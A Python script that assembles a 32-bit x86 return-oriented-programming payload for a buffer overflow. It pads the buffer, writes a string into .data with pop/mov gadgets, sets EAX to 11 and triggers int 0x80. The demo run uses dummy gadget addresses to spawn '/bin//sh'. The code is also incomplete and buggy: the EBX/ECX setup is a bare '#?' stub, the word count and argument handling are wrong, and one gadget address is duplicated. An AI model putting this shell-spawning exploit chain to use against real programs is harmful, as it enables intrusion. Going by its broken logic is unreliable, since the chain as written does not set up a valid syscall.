from struct import pack

gadgetdictionary = {
    "NULL" : 0x0
}

def execve(arguments, bufflength, gadgets):
    gadgetdictionary.update(gadgets)

    #add buffer string
    payload = b'A' * bufflength

    #set up data
    for arg in arguments:
        payload += AddArgument(arg)
    
    #?

    #set eax to 11
    payload += SetEAX(11)

    #syscall
    payload += pack('<I', A2R("int 0x80"))

    return payload

def AddArgument(argument):
    numwords = int(len(argument)) + 1
    s = b''
    for i in range(numwords):
        s += pack('<I', A2R("pop edx"))
        s += pack('<I', A2R("@ .data") + (i * 4))
        s += pack('<I', A2R("pop eax"))
        s += argument[i*4:(i+1)*4].encode("utf-8")
        s += pack('<I', A2R("mov dword ptr [edx], eax"))
    return s

def SetEAX(value):
    s = pack('<I', A2R("xor eax, eax"))
    for i in range(value):
        s += pack('<I', A2R("inc eax"))
    return s

def A2R(instruction):
    #Assembly to ROP    
    return int(gadgetdictionary[instruction])


if __name__ == "__main__":
    dummydict = {
        "xor eax, eax" : 0x42424242,
        "inc eax" : 0x43434343,
        "int 0x80" : 0x44444444,
        "pop eax" : 0x45454545,
        "pop ebx" : 0x46464646,
        "pop ecx" : 0x47474747,
        "pop edx" : 0x48484848,
        "@ .data" : 0x49494949,
        "mov dword ptr [edx], eax" : 0x48484848,
    }
    print(execve("/bin//sh", 44, dummydict))